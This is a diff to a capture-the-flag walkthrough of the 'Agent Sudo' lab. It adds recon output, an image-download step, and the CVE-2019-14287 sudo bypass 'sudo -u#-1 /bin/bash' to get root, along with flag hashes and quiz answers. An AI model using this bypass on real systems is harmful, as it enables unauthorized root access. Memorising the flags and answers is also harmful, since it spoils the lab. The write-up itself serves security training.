@@ -10,7 +10,7 @@
 
 ### Task 1 - Deploy the machine
 
-🎯 Target IP: `10.10.80.70`
+🎯 Target IP: `10.10.62.30`
 
 Create a directory for machine on the Desktop and a directory containing the scans with nmap.
 
@@ -18,7 +18,7 @@ Create a directory for machine on the Desktop and a directory containing the sca
 
 ```bash
 su
-echo "10.10.80.70 agent_sudo.thm" >> /etc/hosts
+echo "10.10.62.30 agent_sudo.thm" >> /etc/hosts
 
 mkdir thm/agent_sudo.thm  
 cd thm/agent_sudo.thm
@@ -32,10 +32,10 @@ I prefer to start recon by pinging the target, this allows us to check connectiv
 
 ```bash
 ping -c 3 agent_sudo.thm
-PING agent_sudo.thm (10.10.80.70) 56(84) bytes of data.
-64 bytes from agent_sudo.thm (10.10.80.70): icmp_seq=1 ttl=63 time=132 ms
-64 bytes from agent_sudo.thm (10.10.80.70): icmp_seq=2 ttl=63 time=81.8 ms
-64 bytes from agent_sudo.thm (10.10.80.70): icmp_seq=3 ttl=63 time=123 ms
+PING agent_sudo.thm (10.10.62.30) 56(84) bytes of data.
+64 bytes from agent_sudo.thm (10.10.62.30): icmp_seq=1 ttl=63 time=132 ms
+64 bytes from agent_sudo.thm (10.10.62.30): icmp_seq=2 ttl=63 time=81.8 ms
+64 bytes from agent_sudo.thm (10.10.62.30): icmp_seq=3 ttl=63 time=123 ms
 ```
 
 Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.
@@ -50,16 +50,16 @@ nmap --open -n -Pn -vvv -T4 agent_sudo.thm
 
 ```bash
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 14:49 EDT
-Warning: Hostname agent_sudo.thm resolves to 2 IPs. Using 10.10.80.70.
+Warning: Hostname agent_sudo.thm resolves to 2 IPs. Using 10.10.62.30.
 Initiating SYN Stealth Scan at 14:49
 Scanning agent_sudo.thm (10.10.80.70) [1000 ports]
-Discovered open port 80/tcp on 10.10.80.70
-Discovered open port 22/tcp on 10.10.80.70
-Discovered open port 21/tcp on 10.10.80.70
+Discovered open port 80/tcp on 10.10.62.30
+Discovered open port 22/tcp on 10.10.62.30
+Discovered open port 21/tcp on 10.10.62.30
 Completed SYN Stealth Scan at 14:49, 1.15s elapsed (1000 total ports)
-Nmap scan report for agent_sudo.thm (10.10.80.70)
+Nmap scan report for agent_sudo.thm (10.10.62.30)
 Host is up, received user-set (0.078s latency).
-Other addresses for agent_sudo.thm (not scanned): 10.10.80.70
+Other addresses for agent_sudo.thm (not scanned): 10.10.62.30
 Scanned at 2023-07-02 14:49:50 EDT for 1s
 Not shown: 997 closed tcp ports (reset)
 PORT   STATE SERVICE REASON
@@ -89,7 +89,6 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: 400 Bad Request
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
 It looks like there are three open ports on the machine: 21, 22, 80.
@@ -98,7 +97,7 @@ It looks like there are three open ports on the machine: 21, 22, 80.
 
 <div align="left">
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-02 22-30-24.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/Schermata del 2023-07-04 20-29-20.png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -448,30 +447,93 @@ b03d975e8c92a7c04146cfa7a5a313c7
 
 #### 5.2 - What is the incident of the photo called?
 
-\
+We need to find out where the image is from. You can use the command below to download the image from the machine and do a reverse image search on Google
 
+```bash
+scp james@10.10.62.30:Alien_autospy.jpg /home/
+```
 
+We can do a reverse image search on this jpg using Google:
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-04 20-25-23.png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+Roswell alien autopsy
+{% endhint %}
 
 ### Task 6 - Privilege escalation
 
 #### 6.1 - CVE number for the escalation&#x20;
 
+We can check the user's permissions by the following command:
+
+```bash
+sudo -l
+```
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-04 20-02-19.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Googling the result we find the following vulnerability:
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-04 20-03-10.png" alt=""><figcaption></figcaption></figure>
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-04 20-09-48.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+In alternative we can retrieve sudo version and find it on searchsploit.\
 
 
+{% hint style="info" %}
+CVE-2019-14287
+{% endhint %}
+
+#### 6.2 - What is the root flag?
+
+We use this exploit to scale privileges:\
 
 
-6.2 - What is the root flag?
+```bash
+sudo -u#-1 /bin/bash
+```
+
+We're root!
+
+```bash
+whoami
+root
+cd /root
+ls
+root.txt
+cat root.txt
+```
+
+<details>
+
+<summary>🚩 Flag 2 (root.txt)</summary>
+
+b53a02f55b57d4439e3341834d70c062
+
+</details>
+
+#### 6.3 - (Bonus) Who is Agent R?
 
 \
+Reading all message of root's flag, we can say the name of agent R:
 
+_To Mr.hacker,_
 
+_Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine._
 
+_By, DesKel a.k.a Agent R_
 
-6.3 - (Bonus) Who is Agent R?
-
-\
-
-
-
+{% hint style="info" %}
+DesKel
+{% endhint %}
 
